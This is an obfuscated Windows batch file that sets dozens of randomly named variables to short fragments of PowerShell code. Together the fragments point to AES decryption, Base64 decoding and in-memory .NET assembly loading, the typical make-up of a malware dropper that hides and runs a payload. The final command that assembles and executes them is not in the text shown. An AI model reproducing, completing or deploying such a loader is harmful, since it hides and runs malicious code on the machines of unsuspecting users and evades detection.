@echo off
set "ygzxZRQjmv=ress"
set "jazgnIFUOR=X = "
set "PaIkeKsZWy=yste"
set "KFWKksIlSf=sion"
set "xvylmDxsEv= New"
set "GRrhgqorSX=ment"
set "joOitXfFUZ=ing("
set "bnUUMCuWWn=pher"
set "sDJjQRcVdI=F'[-"
set "kmzCzSgeKe=ptor"
set "mLOhfEbHDu=k; }"
set "uNgrObShVl=O.Me"
set "gkKyQHStIV=PxEW"
set "ZuyJiCUrHF=Bmor"
set "jJvJMbCiBd=cd.I"
set "LHaamNTpor='gni"
set "MntYFJojBK='txe"
set "XBbUMrKnJl=Obje"
set "AsoksGccSu=16] "
set "iJrkELzmor=7;$o"
set "yADQylnBad=6esa"
set "wosZZzhjPm=ptog"
set "SyKfyzaJDR=XL.T"
set "yxhgBDwYmT=m.IO"
set "vFMWpnXrDZ=$fvo"
set "equFOtAYXM=rofi"
set "bwjdIABZdb=stem"
set "sAhXfUADVp=X, 0"
set "FnbrEpClgn=nirt"
set "vdCfbfcsaq=s75K"
set "OhaHsOYcpK=ach "
set "xilEpLoLip=[]] "
set "wVfYsPGwse=fvor"
set "GlyhFXgNcf=pPy."
set "kxUaxKxgEe=.Ass"
set "zpZXSBPCWc=..-1"
set "XiQjoLIbIM=ispo"
set "gfQDVhiOzh=ypto"
set "dkyindfxCl=::('"
set "TlrFvaQSHN=lBlo"
set "HNtZFYCLao=ptog"
set "NGMNeyhuCt=Secu"
set "CeRaJxdcbF=.Dis"
set "XSkoiqXrxC=('Tg"
set "hAkPgamMLV=PXoc"
set "sOWZNXToWv=]::("
set "GcPgeZpvNz=y.Cr"
set "gnhwAVWCrt=saBm"
set "YYfPBGKZat=ay()"
set "cheEcZIAUo=.Key"
set "ZlyJSmEPUy=pose"
set "mhsYrcQSTa=($WW"
set "pyxhpeBhbm=join"
set "FVWgVxkUbI=ose("
set "UepVWAXVUc=Mxcd"
set "bdfXWoVRzh=.Sec"
set "GVJXcEEjrq=brea"
set "tZiWdkfAsX=nWu."
set "ZqvzYNugrq=morF"
set "zzqNDYoYTW=hy.A"
set "rPtFYwFCvX=ose("
set "TERZLlTYfH=gsYZ"
set "GuTkOuXvIF=ne);"
set "TjVCiGmWVQ=Mxcd"
set "MbeOAeNXKG=Conv"
set "ICFhxqfTXt=nage"
set "feMutOymKR=);$S"
set "doAhTfekyR=oint"
set "xKOGfaoyQk=)($L"
set "SfcbZQDFqj=stem"
set "aSeZMbELdy=oArr"
set "sfYioCDVAw=esaB"
set "fvDrpaHGtx=ect "
